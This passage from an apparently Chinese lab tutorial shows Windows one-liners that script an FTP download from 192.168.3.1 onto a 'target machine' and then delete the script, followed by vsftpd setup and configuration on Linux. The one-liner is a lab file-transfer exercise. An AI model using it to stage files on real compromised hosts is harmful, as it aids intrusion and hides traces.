<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301443110.webp" alt="image-20230930144307999" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301443110.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301443110.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301443110.webp?size=large 2x" data-title="image-20230930144307999" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以看到hello.txt文件被下载到靶机：</p>
<p>以上操作可以简化为：</p>
<pre tabindex="0"><code>Echo open 192.168.3.1 &gt; o&amp;echo user monster a123456 &gt;&gt; o &amp;echo get hello.txt &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp -n -s:o &amp;del /F /Q o</code></pre><p>如果ftp允许匿名账号登陆，还可简化为：</p>
<pre tabindex="0"><code>Echo open 192.168.3.1 &gt; o &amp;echo get hello.txt &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp -A -n -s:o &amp;del /F /Q o</code></pre><p>提一嘴，靶机下载的路径就是3CDaemon所在的路径</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301442362.webp" alt="image-20230930144251217" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301442362.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301442362.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301442362.webp?size=large 2x" data-title="image-20230930144251217" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="上传" class="heading-element"><span>上传</span>
  <a href="#%e4%b8%8a%e4%bc%a0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>如果是上传文件到ftp服务器，则使用put：</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429804.webp" alt="image-20230930142929715" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429804.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429804.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429804.webp?size=large 2x" data-title="image-20230930142929715" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429159.webp" alt="image-20230930142920054" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429159.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429159.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301429159.webp?size=large 2x" data-title="image-20230930142920054" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="linux" class="heading-element"><span>linux</span>
  <a href="#linux" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://www.linuxprobe.com/chapter-11.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.linuxprobe.com/chapter-11.html</a></p>
<blockquote>
<p>vsftpd是“very secure TTP daemon”的缩写，是一个完全免费的、开放源代码的ftp服务器软件</p>
</blockquote>
<ul>
<li>FTP可以有三种登入方式分别是：</li>
</ul>
<ol>
<li>匿名登录方式：不需要用户密码</li>
<li>本地用户登入：使用本地用户和密码登入</li>
<li>虚拟用户方式：也是使用用户和密码登入，但是该用户不是linux中创建的用户</li>
</ol>
<h3 id="安装" class="heading-element"><span>安装</span>
  <a href="#%e5%ae%89%e8%a3%85" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>检查Linux系统是否安装了vsftpd的命令：rpm -qa|grep vsftpd

卸载vsftpd的命令yum remove vsftpd

执行yum -y install vsftpd

使用whereis vsftpd 查看安装路径
[root@localhost ~]#whereis vsftpd</code></pre><h3 id="配置" class="heading-element"><span>配置</span>
  <a href="#%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>安装完之后在/etc/vsftpd/路径下会存在三个配置文件。</p>
<p>yum安装vsftpd的默认配置文件在/etc/vsftpd/vsftpd.conf</p>
<p>vsftpd.conf: 主配置文件</p>
<p>ftpusers: 指定哪些用户不能访问FTP服务器,这里的用户包括root在内的一些重要用户。</p>
<p>user_list: 指定的用户是否可以访问ftp服务器，通过vsftpd.conf文件中的userlist_deny的配置来决定配置中的用户是否可以访问，userlist_enable=YES ，userlist_deny=YES ，userlist_file=/etc/vsftpd/user_list 这三个配置允许文件中的用户访问FTP。</p>
<p>anonymous_enable=YES #允许匿名用户</p>
<p>local_enable=YES #允许使用本地用户账号登陆</p>
<p>write_enable=YES #允许ftp用户写数据</p>
<p>connect_from_port_20=YES #通过20端口传输数据</p>
<h3 id="创建用户" class="heading-element"><span>创建用户</span>
  <a href="#%e5%88%9b%e5%bb%ba%e7%94%a8%e6%88%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>创建用户dongyu
useradd dongyu

设置用户只能ftp不能登入
usermod -s /sbin/nologin ftpuser

设置用户密码
passwd ftpusr</code></pre><p>这里我打算把上传和下载目录放在这里</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301527760.webp" alt="image-20230930152756647" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301527760.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301527760.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301527760.webp?size=large 2x" data-title="image-20230930152756647" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>启动FTP服务</p>
<pre tabindex="0"><code>service vsftpd start   启动
service vsftpd restart   更改配置后重启
systemctl status vsftpd.service  检查状态</code></pre><p>配置文件</p>
<p>这个工具的配置文件貌似很娇贵，不能有空格之类的</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Example config file /etc/vsftpd/vsftpd.conf</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># The default compiled in settings are fairly paranoid. This sample file</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># loosens things up a bit, to make the ftp daemon more usable.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Please see vsftpd.conf.5 for all compiled in defaults.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># READ THIS: This example file is NOT an exhaustive list of vsftpd options.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd&#39;s</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># capabilities.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Allow anonymous FTP? (Beware - allowed by default if you comment this out).</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">anonymous_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Uncomment this to allow local users to log in.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># When SELinux is enforcing check for SE bool ftp_home_dir</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">local_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Uncomment this to enable any form of FTP write command.</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">write_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Default umask for local users is 077. You may wish to change this to 022,</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># if your users expect that (022 is used by most other ftpd&#39;s)</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">local_umask</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">022</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Uncomment this to allow the anonymous FTP user to upload files. This only</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># has an effect if the above global write enable is activated. Also, you will</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># obviously need to create a directory writable by the FTP user.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># When SELinux is enforcing check for SE bool allow_ftpd_anon_write, allow_ftpd_full_access</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#anon_upload_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Uncomment this if you want the anonymous FTP user to be able to create</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># new directories.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#anon_mkdir_write_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Activate directory messages - messages given to remote users when they</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># go into a certain directory.</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">dirmessage_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Activate logging of uploads/downloads.</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xferlog_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Make sure PORT transfer connections originate from port 20 (ftp-data).</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">connect_from_port_20</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># If you want, you can arrange for uploaded anonymous files to be owned by</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># a different user. Note! Using &#34;root&#34; for uploaded files is not</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># recommended!</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#chown_uploads=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#chown_username=whoever</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># You may override where the log file goes if you like. The default is shown</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># below.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#xferlog_file=/var/log/xferlog</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># If you want, you can have your log file in standard ftpd xferlog format.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Note that the default log file location is /var/log/xferlog in this case.</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xferlog_std_format</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># You may change the default value for timing out an idle session.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#idle_session_timeout=600</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># You may change the default value for timing out a data connection.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#data_connection_timeout=120</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># It is recommended that you define on your system a unique user which the</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># ftp server can use as a totally isolated and unprivileged user.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#nopriv_user=ftpsecure</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Enable this and the server will recognise asynchronous ABOR requests. Not</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># recommended for security (the code is non-trivial). Not enabling it,</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># however, may confuse older FTP clients.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#async_abor_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># By default the server will pretend to allow ASCII mode but in fact ignore</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># the request. Turn on the below options to have the server actually do ASCII</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># mangling on files when in ASCII mode.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Beware that on some FTP servers, ASCII support allows a denial of service</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># attack (DoS) via the command &#34;SIZE /big/file&#34; in ASCII mode. vsftpd</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># predicted this attack and has always been safe, reporting the size of the</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># raw file.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># ASCII mangling is a horrible feature of the protocol.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#ascii_upload_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#ascii_download_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># You may fully customise the login banner string:</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#ftpd_banner=Welcome to blah FTP service.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># You may specify a file of disallowed anonymous e-mail addresses. Apparently</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># useful for combatting certain DoS attacks.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#deny_email_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># (default follows)</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#banned_email_file=/etc/vsftpd/banned_emails</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># You may specify an explicit list of local users to chroot() to their home</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># directory. If chroot_local_user is YES, then this list becomes a list of</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># users to NOT chroot().</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># (Warning! chroot&#39;ing can be very dangerous. If using chroot, make sure that</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># the user does not have write access to the top level directory within the</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># chroot)</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#chroot_local_user=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#chroot_list_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># (default follows)</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#chroot_list_file=/etc/vsftpd/chroot_list</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># You may activate the &#34;-R&#34; option to the builtin ls. This is disabled by</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># default to avoid remote users being able to cause excessive I/O on large</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># sites. However, some broken FTP clients such as &#34;ncftp&#34; and &#34;mirror&#34; assume</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># the presence of the &#34;-R&#34; option, so there is a strong case for enabling it.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#ls_recurse_enable=YES</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># When &#34;listen&#34; directive is enabled, vsftpd runs in standalone mode and</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># listens on IPv4 sockets. This directive cannot be used in conjunction</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># with the listen_ipv6 directive.</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">listen</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">NO</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># This directive enables listening on IPv6 sockets. By default, listening</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># on the IPv6 &#34;any&#34; address (::) will accept connections from both IPv6</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># sockets. If you want that (perhaps because you want to listen on specific</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># addresses) then you must run two copies of vsftpd with two configuration</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># files.</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Make sure, that one of the listen options is commented !!</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">listen_ipv6</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">pam_service_name</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">vsftpd</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">userlist_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">tcp_wrappers</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">use_localtime</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">reverse_lookup_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">NO</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">anonymous_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>  <span style="color:#828b96;font-style:italic">#允许匿名用户登录FTP服务器</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">local_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>  <span style="color:#828b96;font-style:italic">#允许本地用户通过用户名和密码登录FTP服务器</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">write_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>  <span style="color:#828b96;font-style:italic">#允许用户在FTP服务器上进行写操作，包括上传、删除和重命名文件等</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">local_umask</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">022</span>  <span style="color:#828b96;font-style:italic">#设置本地用户创建文件和目录的默认权限掩码。该值为022表示新创建的文件和目录将具有644和755的默认权限。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">dirmessage_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span> <span style="color:#828b96;font-style:italic">#启用在用户进入目录时显示的消息功能。当用户进入一个目录时，服务器可以显示一个包含有关该目录的信息的文件。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xferlog_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span>  <span style="color:#828b96;font-style:italic">#启用传输日志记录功能</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">connect_from_port_20</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span> <span style="color:#828b96;font-style:italic">#指定FTP服务器使用20号端口作为主动模式数据连接的源端口。FTP服务器使用20号端口向客户端发送数据，而客户端使用21号端口进行控制连接。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xferlog_std_format</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span> <span style="color:#828b96;font-style:italic">#设置传输日志的格式为标准格式。这将使传输日志按照常规的Apache日志格式记录。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">listen</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">NO</span> <span style="color:#828b96;font-style:italic">#禁止FTP服务器监听所有IP地址的所有网络接口。这意味着FTP服务器只会监听指定的IP地址或网络接口。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">listen_ipv6</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span><span style="color:#828b96;font-style:italic"># 启用IPv6支持，允许FTP服务器监听IPv6连接。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">pam_service_name</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">vsftpd</span><span style="color:#828b96;font-style:italic">#指定用于认证的PAM（Pluggable Authentication Modules）服务名称。PAM是一种用于进行用户身份验证和授权的系统级身份验证机制。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">userlist_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span><span style="color:#828b96;font-style:italic">#启用用户列表功能。通过用户列表，可以限制哪些用户可以访问FTP服务器。</span>
